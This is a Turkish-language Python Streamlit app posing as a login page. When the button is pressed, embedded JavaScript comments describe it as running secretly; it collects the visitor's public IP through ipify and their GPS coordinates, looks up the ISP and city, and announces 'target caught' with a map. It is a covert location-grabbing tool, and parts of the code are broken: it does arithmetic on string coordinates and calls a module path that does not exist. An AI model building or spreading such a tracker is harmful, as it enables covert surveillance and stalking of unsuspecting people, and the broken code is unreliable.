import streamlit as st
import streamlit.components.v1 as components
import requests
import time

st.set_page_config(page_title="Giriş", layout="centered")

# Gizli depolama alanları (Veriler buraya doldurulacak)
st.text_input("IP", key="target_ip", label_visibility="collapsed")
st.text_input("LOC", key="target_loc", label_visibility="collapsed")

# Butona basılma kontrolü
if st.button("🚀 BAŞLAT", use_container_width=True):
    st.info("Sistem başlatıldı, veriler çekiliyor...")

    # SİHİRLİ JAVASCRIPT KODU
    # Bu kod, butona basıldığında gizlice çalışır ve bilgileri alıp kutulara yazar
    magic_script = """
    <script>
        console.log("Operation Started.");

        // 1. IP Adresini Çek
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            // IP'yi Streamlit'e gönder
            updateInput('target_ip', data.ip);
            
            // 2. Konum Bilgisini Çek
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    let loc_str = lat + "," + lon;
                    
                    // Konumu Streamlit'e gönder
                    updateInput('target_loc', loc_str);
                    
                    // İşlem bittiğinde sayfayı yenile (rerun emri ver)
                    reloadApp();
                }, function(error) {
                    console.log("GPS Hatası veya Reddedildi.");
                    // Konum olmasa bile sayfayı yenile ki IP görünsün
                    reloadApp();
                });
            } else {
                reloadApp();
            }
        });

        // Verileri input kutularına yazan fonksiyon
        function updateInput(id, value) {
            let input = window.parent.document.getElementById(id);
            if (input) {
                input.value = value;
                input.dispatchEvent(new Event('input', { bubbles: true }));
            }
        }

        // Streamlit'i yenilemeye zorlayan fonksiyon
        function reloadApp() {
            setTimeout(() => {
                window.location.reload();
            }, 1000); // 1 saniye bekleyip yenile
        }
    </script>
    """
    
    # Kodu çalıştır
    components.html(magic_script, height=0)
    time.sleep(2) # Verilerin gitmesi için bekle

# --- EKRAN GÖRÜNTÜLEME BÖLÜMÜ ---
# Eğer IP kutusu doluysa, verileri göster
if st.session_state.target_ip:
    
    # Başarılı mesajı ve Veriler
    st.success("✅ BAŞARILI! HEDEF YAKALANDI.")
    
    ip = st.session_state.target_ip
    loc = st.session_state.target_loc
    
    # IP Detayları
    st.subheader("🌐 Ağ Bilgileri")
    try:
        data = requests.get(f'http://ip-api.com/json/{ip}').json()
        col1, col2 = st.columns(2)
        with col1:
            st.metric("IP Adresi", ip)
            st.metric("Ülke", data.get('country'))
            st.metric("Şehir", data.get('city'))
        with col2:
            st.metric("ISP", data.get('isp'))
            st.metric("Zaman Dilimi", data.get('timezone'))
    except:
        st.error("Bilgi alınamadı.")

    # GPS Konumu
    if loc:
        st.subheader("📱 GPS Konumu")
        st.info(f"Koordinatlar: {loc}")
        try:
            lat, lon = loc.split(',')
            map_url = f"https://www.openstreetmap.org/export/embed.html?bbox={lon-0.1},{lat-0.1},{lon+0.1},{lat+0.1}&layer=mapnik&marker={lat},{lon}"
            components.v1.iframe(map_url, height=300)
        except:
            pass
else:
    # Eğer veri yoksa, sadece buton olsun
    st.markdown("<br>", unsafe_allow_html=True)
    
